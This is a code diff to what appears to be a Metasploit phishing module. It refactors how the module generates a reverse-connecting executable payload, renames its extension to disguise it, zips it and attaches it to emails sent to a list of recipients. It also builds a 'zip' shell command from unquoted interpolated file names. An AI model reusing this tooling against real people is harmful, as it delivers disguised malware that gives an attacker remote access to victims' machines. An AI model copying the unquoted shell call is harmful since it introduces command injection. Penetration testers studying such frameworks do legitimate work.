@@ -78,6 +78,8 @@ class Metasploit3 < Msf::Auxiliary
         msf_payload_ext = yamlconf['msf_payload_ext']
 
 
+		tmp = Dir.tmpdir
+
 		datastore['MAILFROM'] = from
 
 		msg = File.open(msg_file).read
@@ -89,52 +91,53 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
         if  make_payload
+			attachment_file = File.join(tmp, msf_filename)
+			attachment_file_name = msf_filename
+
 			print_status("Creating payload...")
 			mod = framework.payloads.create(msf_payload)
-			if (mod)
-				# By not passing an explicit encoder, we're asking the
-				# framework to pick one for us.  In general this is the best
-				# way to encode.
-				buf = mod.generate_simple(
-						'Format'  => 'raw',
-						'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
-					)
-				exe = Msf::Util::EXE.to_executable(framework, mod.arch, mod.platform, buf)
-				print_status("Writing payload to #{msf_filename}")
-				File.open("/tmp/#{msf_filename}", "wb") do |f|
-					f.write(exe)
-				end
-			else
+			if (not mod)
 				print_error("Failed to create payload, #{msf_payload}")
 				return
 			end
 
+			# By not passing an explicit encoder, we're asking the
+			# framework to pick one for us.  In general this is the best
+			# way to encode.
+			buf = mod.generate_simple(
+					'Format'  => 'raw',
+					'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
+				)
+			exe = Msf::Util::EXE.to_executable(framework, mod.arch, mod.platform, buf)
+
+			print_status("Writing payload to #{attachment_file}")
+			# XXX If Rex::Zip will let us zip a buffer instead of a file,
+			# there's no reason to write this out
+			File.open(attachment_file, "wb") do |f|
+				f.write(exe)
+			end
+
 			if msf_change_ext
-				msf_payload_newext = msf_filename
+				msf_payload_newext = attachment_file
 				msf_payload_newext = msf_payload_newext.sub(/\.\w+$/, ".#{msf_payload_ext}")
-				File.rename("/tmp/#{msf_filename}", "/tmp/#{msf_payload_newext}")
-				msf_filename = msf_payload_newext
+				File.rename(attachment_file, msf_payload_newext)
+				attachment_file = msf_payload_newext
 			end
 
 			if zip_payload
-				zip_file = msf_filename
-				zip_file = zip_file.gsub(/\.\w+/, '.zip')
-				system("zip -r /tmp/#{zip_file} /tmp/#{msf_filename} > /dev/null 2>&1");
-				msf_filename         = zip_file
+				zip_file = attachment_file.sub(/\.\w+$/, '.zip')
+				system("zip -r #{zip_file} #{attachment_file}> /dev/null 2>&1");
+				attachment_file      = zip_file
 				attachment_file_type = 'application/zip'
 			else
 				attachment_file_type = 'application/exe'
 			end
 
-			attachment_file = "/tmp/#{msf_filename}"
-			attachment_file_name = msf_filename
         end
 
 
 		File.open(fileto).each do |l|
-			if l !~ /\@/
-				nil
-			end
+			next if l !~ /\@/
 
 			nem = l.split(',')
 			name = nem[0].split(' ')
